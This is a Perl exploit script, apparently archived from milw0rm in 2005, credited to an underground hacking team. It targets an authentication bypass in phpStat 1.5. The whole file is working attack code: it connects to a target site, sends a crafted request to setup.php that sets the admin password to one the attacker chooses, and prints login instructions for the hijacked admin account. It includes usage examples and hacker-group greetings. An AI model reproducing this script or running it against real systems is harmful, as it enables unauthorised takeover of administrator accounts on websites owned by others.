#!/usr/bin/perl
#####################################################################
#T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m
#####################################################################
# EXPLOIT FOR - PHPStat Setup.PHP Authentication Bypass Vulnerability
#
#Exploit By :  A l p h a _ P r o g r a m m e r ( Sirus-v )
#E-Mail : Alpha_Programmer@Yahoo.com
#
#This Xpl Change Admin's Pass in This Portal !!
#Discovered by: SoulBlack
#
#Vulnerable Version : phpStat 1.5
#
#####################################################################
# Gr33tz To ==>   mh_p0rtal , Oil_karchack , Str0ke  &  AlphaST.Com
#
# So Iranian Hacking & Security Teams :
#
# Crouz , Shabgard , Simorgh-ev ,IHS , Emperor & GrayHatz.NeT
#####################################################################


use IO::Socket;

if (@ARGV < 3)
{
 print "\n==========================================\n";
 print " \n     -- Exploit By Alpha Programmer --\n\n";
 print "     Trap-Set UnderGrounD Hacking Team      \n\n";
 print "         Usage: <T4rg3t> <DIR> <Password>\n\n";
 print "==========================================\n\n";
 print "Examples:\n\n";
 print "    phpStat.pl www.Site.com /phpstat/ 12345\n";
 exit();
}

my $host = $ARGV[0];
my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host,
PeerPort => "80" );

unless ($remote) { die "C4nn0t C0nn3ct to $host" }

print "C0nn3cted\n";

$http = "GET $ARGV[1]setup.php?check=yes&username=admin&password=$ARGV[2] HTTP/1.0\n";
$http .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)\n";
$http .= "Host: $host\n\n\n\n";

print "[+]Sending H3ll Packet ...\n";
print $remote $http;
sleep(1);
print "[+]Wait For Authentication Bypass ...\n";
sleep(100);
while (<$remote>)
{
}
print "[+]OK ! Now Goto $host$ARGV[1]setup.php And L0gin Whith:\n\n";
print "[+]User: admin\n";
print "[+]Pass: $ARGV[2]";

# milw0rm.com [2005-05-30]
